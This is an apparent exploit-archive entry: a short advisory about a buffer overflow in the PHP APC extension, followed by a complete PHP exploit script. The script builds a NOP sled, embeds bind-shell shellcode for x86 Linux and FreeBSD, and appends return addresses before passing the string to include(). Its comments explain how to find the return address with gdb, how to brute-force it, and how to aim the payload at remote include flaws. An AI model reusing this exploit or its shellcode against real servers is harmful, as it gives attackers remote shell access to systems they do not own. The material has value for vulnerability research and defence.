source: http://www.securityfocus.com/bid/28457/info

PECL Alternative PHP Cache (APC) extension is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

Versions prior to APC 3.0.17 are affected. 

<?php
/*
 * apcsmash.php: PHP-APC-Stacksmash
 *
 * (c) 2008 dannyp <daniel@papasian.org>
 * Feel free to redistribute in any form as long as you leave this 
notice intact.
 *
 * WHAT IS THIS?  Code that can run server-side and exploit a flaw in 
PHP-APC 3.0.11-3.0.16
 * to set up a reverse shell running as the same user that apache runs 
under.
 *
 * WHAT SYSTEMS ARE VULNERABLE?  Any system running PHP with APC 3.0.11 
through CVS as of
 * March 22nd, 2008 (this includes 3.0.16) is vulnerable.  This exploit 
was written
 * specifically to target the case of PHP being ran by the webserver via 
mod_php, and
 * there is included shellcode for x86 Linux and x86 FreeBSD. 
 * 
 * HOW DO I GET IT TO WORK?  This is not a script that will work for 
scriptkiddies, or 
 * anyone lacking understanding of buffer overflow exploits.  Under 
Linux, it appears that
 * the APC module gets loaded at a different location each time apache 
is started, so you
 * need to figure out what the return address is (RETADDR below) and 
fill it in.  Make sure
 * you keep byteorder straight (i.e. on an x86 platform, if you want to 
jump to 0xbfa784f8
 * you need to have a RETADDR of \xa7\xbf\xf8\x84.
 *
 * WELL HOW THE HECK DO I DO THAT?  The easiest way to figure out the 
return address in
 * is to attach gdb to one of the apache children, break it on the 
exploited function
 * in apc.c, and find the address of fileinfo->fullpath and then add a 
bit to it so you
 * land in the NOOP padding.
 *
 * WILL YOU HELP ME?  I won't help you break into any systems that 
aren't yours, so 
 * no, please don't contact me for technical support for this script.  I 
do consulting
 * work, however, and my rates are very reasonable.
 *
 * WHAT IF I CANT DO THAT?  Well, if you can't do that you're probably 
not working on
 * a machine that you have permission to be doing this sort of thing 
against, so you should
 * really consider buggering off
 *
 * BUT DOESNT THAT MAKE THIS VULNERABILITY HARMLESS?  No, it certainly 
doesn't, because 
 * apache has a (good) habit of respawning itself, so if you needed to 
exploit the
 * vulnerability without the privilege of being able to attach a 
debugger to apache,
 * you can just brute force it.  The easiest way to do that would be to 
have the return
 * address be passed to this script via a $_GET variable, and then set 
some script up
 * to loop through the values you need to try.  As you increase the 
amount of pre-shellcode
 * nooop padding, this actually becomes an easier and easier task, as 
you can jump quite
 * a bit on each try.
 *
 * SO IS THIS EXPLOIT USELESS IF I CANT RUN PHP ON THE TARGET MACHINE?  
Yes.
 *
 * SO IS THIS VULNERABILITY USELESS IF I CANT RUN PHP ON THE TARGET?  
No!  This vulnerability
 * opens people up to real attack in any case where include() and 
friends are called with
 * user input.  This is a SUPER-set of a well known class of 
vulnerabilities in PHP
 * scripts called remote file inclusion (RFI) vulnerabilities.  Standard 
RFI vulnerabilities
 * are easily mitigated by allow_url_fopen being turned off and (to deal 
with NULs) magic
 * quotes turned on.  This attack vector requires neither!
 *
 * TELL ME MORE ABOUT THE SHELLCODE.  The Linux shellcode is courtesy 
http://shellcode.org/Shellcode/linux/bind/
 * and launches a reverse shell on port 20000.  The FreeBSD shellcode is 
the author's own,
 * and it doesn't properly initalize a sockaddr_in so it will bind to a 
different port at different
 * times (this is to be considered a feature, not a bug) but will 
consistently take a port above 1024.
 */

// Delete this line, or you'll surely be disappointed.  I don't plan on 
this being used as an RFI payload...
exit();

// Set the system you're trying to target here 
$system = 'Linux';
if($system == 'FreeBSD') {
	/* How many NOOPs to write before the shellcode */
	define('PREPAD', 400);
	define('SHELLCODE', 
"\x31\xc0\x50\xeb\x7d\xcd\x80\xc3\x5b\xb0\x17\xe8\xf5\xff\xff\xff\x31\xc0\x88\x43\x07\x88\x43\x0b\x89\x43\x10\x40\x50\x40\x50\xb0\x61\xe8\xdf\xff\xff\xff\x89\xc1\xb2\x10\x52\x8d\x53\x0c\x52\x50\xb0\x68\xe8\xce\xff\xff\xff\xb0\x6a\xe8\xc7\xff\xff\xff\x31\xc0\x50\x50\x51\xb0\x1e\xe8\xbb\xff\xff\xff\x89\xc2\x5a\x50\x31\xd2\xb2\x03\xb0\x5a\xe8\xac\xff\xff\xff\x66\xff\x44\x24\x04\xfe\xca\x75\xf0\xb0\x02\xe8\x9c\xff\xff\xff\x85\xc0\x75\xd1\x31\xc9\x8d\x43\x08\x51\x50\x89\xe0\x50\x50\x53\x31\xc0\xb0\x3b\xe8\x83\xff\xff\xff\xe8\x81\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x2d\x69\x20\x58\x80\x80\xa7\x22\xff\xff\xef\x1d\xff\xff\xef\x1d\x1d");
	/* Our target return address */
	define ('RETADDR', "\xbf\xbf\xb8\xc5");
	/* Padding after the shellcode and before the return address, 
for alignment purposes */
	define ('POSTPAD', 12);
} else {
	define('PREPAD', 4000);
	
define('SHELLCODE',"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80\x89\xc7\x52\x66\x68\x4e\x20\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80");
	define ('POSTPAD', 17);
	define ('RETADDR', "\xa7\xbf\xf8\x84");
}
define ('RETADDRCOUNT', 500);
 
$string = "";
for($i = 0; $i < PREPAD; ++$i) {
	$string .= "\x90";
}
$string .= SHELLCODE;
for($i = 0; $i < POSTPAD; ++$i) {
	$string .= "\x90";
}
for($i = 0; $i < RETADDRCOUNT; ++$i) {
	$string .= RETADDR;
}

// At this point you could print the string out and use it to attack 
remote scripts, if you wanted.
include($string);